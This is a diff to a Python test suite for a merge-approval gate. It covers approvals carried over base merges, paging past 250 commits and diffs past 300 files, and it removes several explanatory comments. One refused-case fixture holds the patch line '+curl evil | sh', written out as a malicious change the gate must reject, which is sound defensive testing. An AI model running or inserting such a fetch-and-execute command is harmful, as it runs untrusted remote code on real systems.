@@ -31,6 +31,9 @@ import babysit_merge_policy as policy  # noqa: E402
 import babysit_verify_evidence as ve  # noqa: E402
 from diff_risk import ChangedFile, LaneEvidence  # noqa: E402
 
+sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent))
+from capped_compare import docs_diff  # noqa: E402
+
 REPO = "example-org/example-repo"
 HEAD = "a" * 40
 BASE = "b" * 40
@@ -176,7 +179,6 @@ class ATrustedApprovalLiftsAHighPath(unittest.TestCase):
         )
 
     def test_a_floor_path_holds_without_that_approval(self) -> None:
-        # A high path is not a person's (owner decision 2026-10-30, #11020).
         later = "2026-10-26T17:20:00Z"
         cases = {
             "no review": [],
@@ -211,9 +213,6 @@ class ATrustedApprovalLiftsAHighPath(unittest.TestCase):
         self.assertNotIn("high-path", str(cost))
 
 
-# An approval of an earlier head carried over base merges (#10224): Kyle
-# (id 5) approved OLD, then a lane merged the base into it, so the head is a
-# merge whose resolve-config change is the one OLD made.
 OLD = "c" * 40
 MAIN = "5" * 40
 CARRIED_PR = PR | {
@@ -243,13 +242,10 @@ TIP = "3" * 40
 MB_OLD = "1" * 40
 MB_HEAD = "2" * 40
 BASE_DOC = {"filename": "docs/base.md", "status": "modified", "patch": "+q"}
-# #10224's shape: main changed a file the pull request also changes, so the
-# net change moved by hunk headers while main's own hunk applies the same.
 SHARED = ".github/actions/collect-base-activity/collect-base-activity.test.mjs"
 SHARED_OLD = {"filename": SHARED, "status": "modified", "patch": "@@ -93 +93 @@\n+mine"}
 SHARED_HEAD = SHARED_OLD | {"patch": "@@ -98 +98 @@\n+mine"}
 SHARED_BASE = {"filename": SHARED, "status": "modified", "patch": "@@ -10 +10 @@\n+theirs"}
-# GitHub's stale-review dismissal on the base merge's push.
 STALE = {
     "event": "review_dismissed",
     "actor": {"login": "lanes[bot]", "type": "Bot"},
@@ -305,6 +301,8 @@ def carried(
     old_files: list[dict[str, object]] | None = None,
     reviews: list[dict[str, object]] | None = None,
     head_commits: list[dict[str, object]] | None = None,
+    head_total: int | None = None,
+    hold_paths: list[str] | None = None,
     pr: dict[str, object] = CARRIED_PR,
     reads: list[str] | None = None,
     now_head: str = HEAD,
@@ -332,7 +330,7 @@ def carried(
                 {"sha": OLD, "parents": [{"sha": MAIN}]},
                 {"sha": HEAD, "parents": [{"sha": OLD}, {"sha": MAIN}]},
             ],
-            "total_commits": len(head_commits or [0, 0]),
+            "total_commits": head_total or len(head_commits or [0, 0]),
         },
     }
 
@@ -353,12 +351,23 @@ def carried(
         if endpoint.endswith(f"...{TIP}"):
             parent = endpoint.rsplit("/", 1)[1].split("...")[0]
             return 200, {"status": "ahead" if parent == MAIN else "diverged"}
+        endpoint, _, query = endpoint.partition("?per_page=100&page=")
+        page = int(query) if query else 0
+
+        def cut(answer: object) -> object:
+            commits = answer.get("commits") if isinstance(answer, dict) else None
+            if not isinstance(commits, list):
+                return answer
+            return answer | {
+                "commits": commits[(page - 1) * 100 : page * 100] if page else commits[:250]
+            }
+
         spec = endpoint.rsplit("/", 1)[1]
         if spec in across:
-            return 200, across[spec]
+            return 200, cut(across[spec])
         sha = endpoint.rsplit("...", 1)[1]
         assert endpoint == f"repos/{REPO}/compare/{TIP}...{sha}", endpoint
-        return 200, compares[sha]
+        return 200, cut(compares[sha])
 
     def paginated(endpoint: str, label: str, *args: object, **kwargs: object) -> object:
         if reads is not None:
@@ -371,9 +380,9 @@ def carried(
     with mock.patch.object(policy, "_get", side_effect=get):
         rows = [approval()] if reviews is None else reviews
         if not any(r.get("state") == "DISMISSED" for r in rows):
-            return policy.carried_lifters(REPO, pr, rows, TRUSTED, floor=policy.floor_for(FLOOR_ROWS))
+            return policy.carried_lifters(REPO, pr, rows, TRUSTED, hold_paths, floor=policy.floor_for(FLOOR_ROWS))
         with mock.patch.object(policy, "_paginated", side_effect=paginated):
-            return policy.carried_lifters(REPO, pr, rows, TRUSTED, floor=policy.floor_for(FLOOR_ROWS))
+            return policy.carried_lifters(REPO, pr, rows, TRUSTED, hold_paths, floor=policy.floor_for(FLOOR_ROWS))
 
 
 class ALiftCarriesOverABaseMerge(unittest.TestCase):
@@ -420,6 +429,76 @@ class ALiftCarriesOverABaseMerge(unittest.TestCase):
             [],
         )
 
+    def test_a_range_past_250_commits_is_read_in_pages(self) -> None:
+        merges = [
+            {"sha": f"{n:040x}", "parents": [{"sha": f"{n - 1:040x}" if n > 1 else OLD}, {"sha": MAIN}]}
+            for n in range(1, 259)
+        ]
+        last = {"sha": HEAD, "parents": [{"sha": merges[-1]["sha"]}, {"sha": MAIN}]}
+        commits = [{"sha": OLD, "parents": [{"sha": MAIN}]}, *merges, last]
+        reads: list[str] = []
+        self.assertEqual(carried([HELD_PATCH], head_commits=commits, reads=reads), ["user5"])
+        self.assertIn(f"repos/{REPO}/compare/{TIP}...{HEAD}?per_page=100&page=3", reads)
+        self.assertEqual(
+            carried([HELD_PATCH], head_commits=commits, head_total=261), [], "a page cut short"
+        )
+
+    def test_the_exact_carry_past_300_files_is_judged_on_the_two_diffs(self) -> None:
+        docs = [{"filename": f"docs/{i}.md", "status": "modified", "patch": "+x"} for i in range(300)]
+        text = docs_diff(301)
+        paths = (*PATHS, *(f"docs/{i}.md" for i in range(301)))
+        case = {
+            "old_files": [HELD_PATCH, SHARED_OLD],
+            "across": ranges(docs, docs),
+            "trees": {HEAD: tree(*paths), MB_HEAD: tree(*paths)},
+        }
+        for name, diffs, lifted in (
+            ("the same diffs", [text, text], ["user5"]),
+            ("a diff that differs in one hunk", [text, text.replace(" +1,3 @@", " +1,4 @@", 1)], []),
+            ("diffs naming fewer files than the listing", [docs_diff(299)] * 2, []),
+        ):
+            with self.subTest(name), mock.patch.object(policy, "_cap_diffs", side_effect=lambda o, n, specs, cs, d=diffs: d if len(specs) == 2 and specs[0].startswith(OLD) else None):
+                self.assertEqual(carried([HELD_PATCH, SHARED_HEAD], **case), lifted)
+        with mock.patch.object(policy, "_cap_diffs", side_effect=lambda o, n, specs, cs: None):
+            self.assertEqual(carried([HELD_PATCH, SHARED_HEAD], **case), [], "no diff read")
+
+    def test_a_push_past_300_files_lifts_on_its_diff_and_not_when_it_does_not_read(
+        self,
+    ) -> None:
+        """The owner's decision Q10 of 2026-10-28, at any size (row L445)."""
+        docs = [{"filename": f"docs/{i}.md", "status": "modified", "patch": "+x"} for i in range(300)]
+        pushed = [{"sha": OLD, "parents": [{"sha": MAIN}]}, {"sha": HEAD, "parents": [{"sha": OLD}]}]
+        across = {
+            f"{OLD}...{HEAD}": {
+                "status": "ahead",
+                "behind_by": 0,
+                "files": docs,
+                "commits": [{"sha": HEAD}],
+                "total_commits": 1,
+            }
+        }
+
+        def read(answer: object) -> object:
+            def cap_diffs(owner: str, name: str, specs: list[str], compares: list[object]) -> object:
+                if specs != [f"{OLD}...{HEAD}"]:
+                    return None
+                if isinstance(answer, Exception):
+                    raise answer
+                return answer
+
+            return cap_diffs
+
+        for name, answer, lifted in (
+            ("a covering diff", [docs_diff(301)], ["user5"]),
+            ("a diff read that fails", policy.PolicyReadError("diff"), []),
+            ("a diff naming fewer files than the listing", [docs_diff(299)], []),
+        ):
+            with self.subTest(name), mock.patch.object(policy, "_cap_diffs", side_effect=read(answer)):
+                self.assertEqual(
+                    carried([HELD_PATCH], head_commits=pushed, across=across, hold_paths=[]),
+                    lifted,
+                )
+
     def test_10224s_shape_carries_when_the_merges_brought_exactly_mains_changes(
         self,
     ) -> None:
@@ -445,8 +524,6 @@ class ALiftCarriesOverABaseMerge(unittest.TestCase):
         )
         self.assertIn(f"repos/{REPO}/git/trees/{HEAD}?recursive=1", reads)
         self.assertIn(f"repos/{REPO}/git/trees/{MB_HEAD}?recursive=1", reads)
-        # The independent security review of #10671: modes come from the
-        # trees, and only a base that is the default branch carries.
         refused = {
             "a merge that also flips a base file's mode": {"trees": {HEAD: tree(*PATHS, flipped="docs/base.md"), MB_HEAD: tree(*PATHS)}},
             "a truncated tree": {"trees": {HEAD: tree(*PATHS), MB_HEAD: tree(*PATHS, truncated=True)}},
@@ -484,8 +561,6 @@ class ALiftCarriesOverABaseMerge(unittest.TestCase):
                 "head_files": [HELD_PATCH | {"patch": "+evil"}],
                 "across": ranges([BASE_DOC, HELD_PATCH | {"patch": "+evil"}], [BASE_DOC]),
             },
-            # The re-review of #10596: a merge that rewrites a non-hold file
-            # the approved head changed, or adds one the base touched.
             "a merge that rewrites scripts/helper.sh": {
                 "old_files": [HELD_PATCH, HELPER],
                 "head_files": [HELD_PATCH, HELPER | {"patch": "+curl evil | sh"}],
@@ -517,8 +592,6 @@ class ALiftCarriesOverABaseMerge(unittest.TestCase):
                     {"sha": HEAD, "parents": [{"sha": OLD}, {"sha": OTHER}]},
                 ],
             },
-            # The third security review of #10596: the head judged moved
-            # before the re-read, or the compare is cut short.
             "a head that moved since it was read": {
                 "head_files": [HELD_PATCH],
                 "now_head": "9" * 40,
@@ -536,7 +609,6 @@ class ALiftCarriesOverABaseMerge(unittest.TestCase):
                 "head_files": [HELD_PATCH],
                 "pr": CARRIED_PR | {"head": CARRIED_PR["head"] | {"repo": None}},
             },
-            # A dismissed approval counts only as GitHub's stale dismissal.
             "a dismissed approval with no dismissal event": {
                 "head_files": [HELD_PATCH],
                 "reviews": [approval("DISMISSED")],
@@ -637,10 +709,6 @@ class LaneRiskRefusal(unittest.TestCase):
         self.assertEqual(held[1:], (False, False))
 
     def test_only_a_security_finding_needs_a_person(self) -> None:
-        # Owner rule 2026-10-26: unbound review evidence, the manifest review
-        # and a failed read go back to the lanes; a CRITICAL finding stays a
-        # person's. A symlink or submodule (an unsafe path) holds but is not a
-        # person's (owner decision 2026-10-30, #11020).
         after = PLUGIN_BASE.replace('"name": "foo",', '"name": "foo", "hooks": {},')
         unproven = babysit_merge.HeadPusherUnproven("head-pusher-unproven:a")
         cases = {
@@ -656,11 +724,6 @@ class LaneRiskRefusal(unittest.TestCase):
                 self.assertIs(held[1], person, held)
 
 
-# An enforcement floor path (`Floor.review`) the gate holds as
-# `review-path:` until the security review binds clean (owner decision Q26
-# option B), as pull request #10908 was held: its security lane bound to the
-# head with open findings below CRITICAL that the lanes App resolved, which
-# only a clean whole review of the head closes (`whole_review_clears`).
 REVIEWED = dataclasses.replace(DOC, path=".github/scripts/pr-unblock/gate-source.mjs")
 
 
